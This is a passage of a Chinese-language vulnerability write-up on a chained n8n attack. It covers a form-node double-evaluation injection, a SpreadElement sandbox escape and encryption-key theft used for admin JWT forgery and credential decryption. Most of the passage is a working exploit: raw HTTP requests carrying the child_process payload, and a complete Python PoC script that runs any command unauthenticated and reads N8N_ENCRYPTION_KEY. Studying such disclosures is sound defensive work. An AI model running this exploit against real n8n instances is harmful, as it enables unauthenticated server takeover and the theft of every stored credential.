+<td>需要重构 AST 遍历逻辑，确保全节点类型覆盖</td>
+</tr>
+</tbody>
+</table>
+<p>v2.4.0 的修复本质上是在"城墙上加高了一截"，但 SpreadElement 绕过是从城墙的地基（AST 编译层）找到了一个缺口。只要标识符重写阶段存在遗漏的节点类型，运行时 sanitizer 再严密也无济于事——因为到了运行时，<code>process</code> 已经是真实的全局对象了。</p>
+<hr />
+<h2>五、CVE-2026-21858：从任意文件读取到Admin认证伪造</h2>
+<p>在通过 CVE-2026-27493 + CVE-2026-27577 实现 RCE 后，攻击者已能在 n8n 服务器上以 <code>node</code> 用户身份执行命令。但攻击链并未止步于此——CVE-2026-21858 提供了一条更隐蔽的横向扩展路径：通过任意文件读取获取 n8n 的加密主密钥，进而伪造管理员认证令牌，完成对整个 n8n 实例的接管。</p>
+<h3>5.1 加密密钥的存储与作用</h3>
+<p>n8n 使用一个主加密密钥（<code>encryptionKey</code>）来加密存储在数据库中的所有凭证。该密钥的来源优先级如下：</p>
+<ol>
+<li>环境变量 <code>N8N_ENCRYPTION_KEY</code></li>
+<li>n8n 配置文件（通常位于 <code>~/.n8n/config</code>）</li>
+<li>首次启动时自动生成并写入配置文件</li>
+</ol>
+<p>所有通过 n8n 界面配置的第三方凭证（AWS Access Key、数据库密码、OAuth Token、API Key 等）在存入数据库前，都会用这个主密钥进行 AES-256 加密。这意味着<strong>获取主密钥 = 解密全部存储凭证</strong>。</p>
+<h3>5.2 文件读取到认证伪造的路径</h3>
+<p>通过 RCE 读取环境变量或配置文件后，攻击者获得 <code>encryptionKey</code>，随后可执行以下提权路径：</p>
+<ol>
+<li>
+<p><strong>读取 <code>N8N_ENCRYPTION_KEY</code></strong>：通过 <code>process.env.N8N_ENCRYPTION_KEY</code> 或读取配置文件获取主密钥。</p>
+</li>
+<li>
+<p><strong>伪造 n8n-auth JWT Token</strong>：n8n 使用 JWT 进行会话认证，JWT 的签名密钥正是 <code>encryptionKey</code>（或由其派生）。攻击者用获取的密钥签发一个 <code>role: "admin"</code> 的 JWT，即可认证为管理员。</p>
+</li>
+<li>
+<p><strong>创建恶意工作流</strong>：以 admin 身份登录后，创建一个包含 <strong>Execute Command 节点</strong>的工作流。该节点允许在工作流执行过程中运行任意 shell 命令。</p>
+</li>
+<li>
+<p><strong>持久化与横向移动</strong>：通过 Execute Command 节点，攻击者可以植入持久化后门、读取数据库中加密的凭证（用主密钥解密）、或以 n8n 服务器为跳板攻击内网其他系统。</p>
+</li>
+</ol>
+<p>这条路径使得攻击者从"单次 RCE"升级为"长期稳定的实例接管"，且整个过程可通过 n8n 的正常 API 完成，隐蔽性极高。</p>
+<hr />
+<h2>六、完整5步攻击链：从表单提交到凭证解密</h2>
+<p>将上述三个 CVE 串联，就构成了一条从公开表单端点到全量凭证解密的完整攻击链。以下是 5 个步骤的完整时序图与详细说明。</p>
+<h3>6.1 攻击链时序图</h3>
+<div class="highlight"><pre><span></span><code><span class="n">sequenceDiagram</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">攻击者</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">F</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">n8n</span><span class="w"> </span><span class="n">Form</span><span class="w"> </span><span class="n">Node</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;/</span><span class="n">form</span><span class="o">/</span><span class="n">contact</span><span class="o">-</span><span class="n">us</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">P1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">Pass</span><span class="w"> </span><span class="mi">1</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="n">getNodeParameter</span><span class="p">()</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">P2</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">Pass</span><span class="w"> </span><span class="mi">2</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="n">prepareFormFields</span><span class="p">()</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">S</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">表达式沙箱</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="err">@</span><span class="n">n8n</span><span class="o">/</span><span class="n">tournament</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">R</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">Node</span><span class="o">.</span><span class="n">js</span><span class="w"> </span><span class="err">运行时</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">DB</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">n8n</span><span class="w"> </span><span class="err">数据库</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="p">(</span><span class="err">加密凭证</span><span class="p">)</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="err">访问公开表单端点（无需认证）</span>
+
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">F</span><span class="p">:</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">form</span><span class="o">/</span><span class="n">contact</span><span class="o">-</span><span class="n">us</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">F</span><span class="p">:</span><span class="w"> </span><span class="err">端点设计上无需认证</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="err">任何人可提交</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="err">提交含</span><span class="w"> </span><span class="n">SpreadElement</span><span class="w"> </span><span class="err">绕过的</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="n">Payload</span>
+
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">F</span><span class="p">:</span><span class="w"> </span><span class="n">Name</span><span class="o">=</span><span class="p">{{</span><span class="w"> </span><span class="n">PAYLOAD</span><span class="w"> </span><span class="p">}}</span><span class="o">&amp;</span><span class="n">Email</span><span class="o">=</span><span class="n">test</span><span class="err">@</span><span class="n">test</span><span class="o">.</span><span class="n">com</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="n">PAYLOAD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">g</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">g</span><span class="o">.</span><span class="n">getBuiltinModule</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">())({</span><span class="o">...</span><span class="n">process</span><span class="p">})</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">Step</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="err">双重求值触发</span><span class="w"> </span><span class="n">Payload</span><span class="w"> </span><span class="err">执行</span>
+
+<span class="w">    </span><span class="n">F</span><span class="o">-&gt;&gt;</span><span class="n">P1</span><span class="p">:</span><span class="w"> </span><span class="err">读取</span><span class="w"> </span><span class="n">HTML</span><span class="w"> </span><span class="err">配置</span><span class="w"> </span><span class="o">=</span><span class="p">{{</span><span class="w"> </span><span class="o">$</span><span class="n">input</span><span class="o">.</span><span class="n">first</span><span class="p">()</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">}}</span>
+<span class="w">    </span><span class="n">P1</span><span class="o">-&gt;&gt;</span><span class="n">P1</span><span class="p">:</span><span class="w"> </span><span class="n">Pass</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="err">求值：将用户</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="err">注入</span><span class="w"> </span><span class="n">HTML</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">P1</span><span class="p">:</span><span class="w"> </span><span class="n">renderedHtml</span><span class="w"> </span><span class="err">现包含</span><span class="w"> </span><span class="p">{{</span><span class="w"> </span><span class="n">PAYLOAD</span><span class="w"> </span><span class="p">}}</span>
+
+<span class="w">    </span><span class="n">P1</span><span class="o">-&gt;&gt;</span><span class="n">P2</span><span class="p">:</span><span class="w"> </span><span class="err">传递渲染后的</span><span class="w"> </span><span class="n">HTML</span>
+<span class="w">    </span><span class="n">P2</span><span class="o">-&gt;&gt;</span><span class="n">P2</span><span class="p">:</span><span class="w"> </span><span class="n">getResolvables</span><span class="p">()</span><span class="w"> </span><span class="err">扫描到</span><span class="w"> </span><span class="p">{{</span><span class="w"> </span><span class="n">PAYLOAD</span><span class="w"> </span><span class="p">}}</span>
+<span class="w">    </span><span class="n">P2</span><span class="o">-&gt;&gt;</span><span class="n">S</span><span class="p">:</span><span class="w"> </span><span class="n">evaluateExpression</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">)</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">S</span><span class="p">:</span><span class="w"> </span><span class="err">@</span><span class="n">n8n</span><span class="o">/</span><span class="n">tournament</span><span class="w"> </span><span class="err">编译表达式</span>
+<span class="w">    </span><span class="n">S</span><span class="o">-&gt;&gt;</span><span class="n">S</span><span class="p">:</span><span class="w"> </span><span class="n">AST</span><span class="w"> </span><span class="err">解析：</span><span class="p">{</span><span class="o">...</span><span class="n">process</span><span class="p">}</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">S</span><span class="p">:</span><span class="w"> </span><span class="n">SpreadElement</span><span class="w"> </span><span class="err">节点</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="n">switch</span><span class="w"> </span><span class="err">无对应</span><span class="w"> </span><span class="n">case</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span><span class="n">process</span><span class="w"> </span><span class="err">未被重写！</span>
+
+<span class="w">    </span><span class="n">S</span><span class="o">-&gt;&gt;</span><span class="n">R</span><span class="p">:</span><span class="w"> </span><span class="n">VM</span><span class="w"> </span><span class="err">执行编译后代码</span>
+<span class="w">    </span><span class="n">R</span><span class="o">-&gt;&gt;</span><span class="n">R</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="o">...</span><span class="n">process</span><span class="p">}</span><span class="w"> </span><span class="err">获取真实</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="err">对象</span>
+<span class="w">    </span><span class="n">R</span><span class="o">-&gt;&gt;</span><span class="n">R</span><span class="p">:</span><span class="w"> </span><span class="n">getBuiltinModule</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">R</span><span class="o">-&gt;&gt;</span><span class="n">R</span><span class="p">:</span><span class="w"> </span><span class="n">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
+
+<span class="w">    </span><span class="n">R</span><span class="o">--&gt;&gt;</span><span class="n">F</span><span class="p">:</span><span class="w"> </span><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">Step</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"> </span><span class="err">读取</span><span class="w"> </span><span class="n">N8N_ENCRYPTION_KEY</span>
+
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">F</span><span class="p">:</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">waiting</span><span class="o">/&lt;</span><span class="n">executionId</span><span class="o">&gt;</span>
+<span class="w">    </span><span class="n">F</span><span class="o">--&gt;&gt;</span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="err">返回命令执行结果</span>
+
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">R</span><span class="p">:</span><span class="w"> </span><span class="err">修改</span><span class="w"> </span><span class="n">Payload</span><span class="w"> </span><span class="err">读取环境变量</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="n">execSync</span><span class="p">(</span><span class="s1">&#39;printenv N8N_ENCRYPTION_KEY&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">R</span><span class="o">--&gt;&gt;</span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="err">返回</span><span class="w"> </span><span class="n">encryptionKey</span><span class="w"> </span><span class="err">明文</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">Step</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"> </span><span class="err">解密数据库中所有存储凭证</span>
+
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="err">用</span><span class="w"> </span><span class="n">encryptionKey</span><span class="w"> </span><span class="err">解密数据库凭证</span>
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="err">读取</span><span class="w"> </span><span class="n">credential_entity</span><span class="w"> </span><span class="err">表（加密数据）</span>
+<span class="w">    </span><span class="n">DB</span><span class="o">--&gt;&gt;</span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="err">返回加密的凭证记录</span>
+<span class="w">    </span><span class="n">A</span><span class="o">-&gt;&gt;</span><span class="n">A</span><span class="p">:</span><span class="w"> </span><span class="n">AES</span><span class="o">-</span><span class="mi">256</span><span class="w"> </span><span class="err">解密</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">AWS密钥</span><span class="o">/</span><span class="err">数据库密码</span><span class="o">/</span><span class="n">OAuth令牌</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="err">攻击完成：</span><span class="n">RCE</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">全量凭证泄露</span>
+</code></pre></div>
+
+<h3>6.2 完整 PoC 代码</h3>
+<p>以下是完整的攻击 PoC，包含 HTTP 请求、Payload 构造与结果获取：</p>
+<div class="highlight"><pre><span></span><code><span class="err"># === Step 1-3: 提交 RCE Payload 到公开表单端点 ===</span>
+
+<span class="nf">POST</span> <span class="nn">/form/contact-us</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">target-n8n-instance.com</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">287</span>
+
+<span class="nt">Name</span><span class="o">=</span><span class="s">{{ ((g) </span><span class="o">=</span><span class="s">&gt; g.getBuiltinModule(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())({...process}) }}</span><span class="p">&amp;</span><span class="nt">Email</span><span class="o">=</span><span class="s">test@test.com</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="err"># === 获取执行结果 ===</span>
+
+<span class="nf">GET</span> <span class="nn">/form-waiting/&lt;executionId&gt;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">target-n8n-instance.com</span>
+
+# 响应中包含命令执行结果：
+# uid=1000(node) gid=1000(node) groups=1000(node)
+</code></pre></div>
+
+<p>以下是使用 Python 实现的完整自动化 PoC 脚本：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">n8n Form Node 双重求值 RCE PoC</span>
+<span class="sd">CVE-2026-27493 + CVE-2026-27577 组合利用</span>
+<span class="sd">仅用于授权安全测试，禁止非法使用</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit_rce</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">form_path</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    通过公开表单端点触发 RCE</span>
+<span class="sd">    :param base_url: n8n 实例地址</span>
+<span class="sd">    :param form_path: 表单路径，如 /form/contact-us</span>
+<span class="sd">    :param command: 要执行的命令</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">target_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">base_url</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="si">}{</span><span class="n">form_path</span><span class="si">}</span><span class="s2">&quot;</span>
+
+    <span class="c1"># 构造 SpreadElement 沙箱逃逸 Payload</span>
+    <span class="c1"># 利用 {...process} 绕过 VariablePolyfill Transformer 的标识符重写</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="s2">&quot;{{ ((g) =&gt; g.getBuiltinModule(&#39;child_process&#39;)&quot;</span>
+        <span class="sa">f</span><span class="s2">&quot;.execSync(&#39;</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#39;).toString())(</span><span class="se">{{</span><span class="s2">...process</span><span class="se">}}</span><span class="s2">) </span><span class="se">}}</span><span class="s2">&quot;</span>
+    <span class="p">)</span>
+
+    <span class="c1"># 表单字段提交</span>
+    <span class="n">form_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Name&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+        <span class="s2">&quot;Email&quot;</span><span class="p">:</span> <span class="s2">&quot;test@test.com&quot;</span>
+    <span class="p">}</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 目标: </span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 命令: </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Payload: </span><span class="si">{</span><span class="n">payload</span><span class="p">[:</span><span class="mi">80</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Step 1-2: 提交 Payload</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">form_data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">301</span><span class="p">,</span> <span class="mi">302</span><span class="p">,</span> <span class="mi">303</span><span class="p">):</span>
+        <span class="c1"># 跟随重定向到 form-waiting 页面获取执行结果</span>
+        <span class="n">redirect_url</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;Location&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">redirect_url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">):</span>
+            <span class="n">redirect_url</span> <span class="o">=</span> <span class="n">base_url</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">redirect_url</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 重定向至: </span><span class="si">{</span><span class="n">redirect_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="c1"># Step 3: 获取执行结果</span>
+        <span class="n">result_response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">redirect_url</span><span class="p">)</span>
+        <span class="n">result_text</span> <span class="o">=</span> <span class="n">result_response</span><span class="o">.</span><span class="n">text</span>
+
+        <span class="c1"># 从响应中提取命令执行输出</span>
+        <span class="c1"># n8n 将表达式求值结果渲染在 form-waiting 页面中</span>
+        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;uid=\d+\([\w]+\).*?gid=\d+\([\w]+\)&quot;</span><span class="p">,</span> <span class="n">result_text</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] RCE 成功! 命令输出: </span><span class="si">{</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[?] 响应内容 (前500字符): </span><span class="si">{</span><span class="n">result_text</span><span class="p">[:</span><span class="mi">500</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">result_text</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[-] 异常状态码: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[-] 响应: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">300</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">None</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">read_encryption_key</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">form_path</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Step 4: 读取 N8N_ENCRYPTION_KEY 环境变量</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 4: 读取加密主密钥...&quot;</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">exploit_rce</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">form_path</span><span class="p">,</span> <span class="s2">&quot;printenv N8N_ENCRYPTION_KEY&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 加密密钥: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;用法: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;base_url&gt; &lt;form_path&gt; [command]&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;示例: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> https://n8n.example.com /form/contact-us id&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">base_url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">form_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="s2">&quot;id&quot;</span>
+
+    <span class="n">exploit_rce</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">form_path</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>6.3 攻击链各步骤技术要点</h3>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>对应 CVE</th>
+<th>技术动作</th>
+<th>关键绕过点</th>
+<th>认证要求</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Step 1</td>
+<td>CVE-2026-27493</td>
+<td>访问 <code>/form/*</code> 公开端点</td>
+<td>无需绕过，端点设计上无认证</td>
+<td>无</td>
+</tr>
+<tr>
+<td>Step 2</td>
+<td>CVE-2026-27493</td>
+<td>在 Name 字段提交 <code>{{ }}</code> Payload</td>
+<td>Pass 1 将用户输入注入 HTML</td>
+<td>无</td>
+</tr>
+<tr>
+<td>Step 3</td>
+<td>CVE-2026-27493 + 27577</td>
+<td>Pass 2 对 Payload 求值执行</td>
+<td>SpreadElement AST 绕过沙箱标识符重写</td>
+<td>无</td>
+</tr>
+<tr>
+<td>Step 4</td>
+<td>CVE-2026-21858</td>
+<td>读取 <code>N8N_ENCRYPTION_KEY</code></td>
+<td>RCE 已实现，直接读取环境变量</td>
+<td>无（已 RCE）</td>
+</tr>
+<tr>
+<td>Step 5</td>
+<td>CVE-2026-21858</td>
+<td>解密数据库凭证</td>
+<td>用主密钥 AES-256 解密 credential 表</td>
+<td>无（已 RCE）</td>
+</tr>
+</tbody>
+</table>
+<p>整条攻击链的可怕之处在于：<strong>Step 1 到 Step 3 完全无需认证</strong>，攻击者只需向公开表单发送一个 HTTP POST 请求，即可获得服务器上的代码执行权限。Step 4-5 则是 RCE 后的自然延伸，将危害从"服务器沦陷"扩展到"组织全部自动化凭证泄露"。</p>
+<hr />
+<h2>七、沙箱逃逸技术对比</h2>
+<p>CVE-2026-27577 并非 n8n 表达式沙箱首次被绕过。为了更全面地理解 n8n 沙箱的攻防演进，下表对比了历史上几种典型的沙箱逃逸技术：</p>
+<table>
+<thead>
+<tr>
+<th>技术维度</th>
+<th>Template Literal 绕过</th>
+<th>Object.defineProperty 绕过</th>
+<th>SpreadElement 绕过 (CVE-2026-27577)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>出现时间</strong></td>
+<td>n8n 早期版本</td>
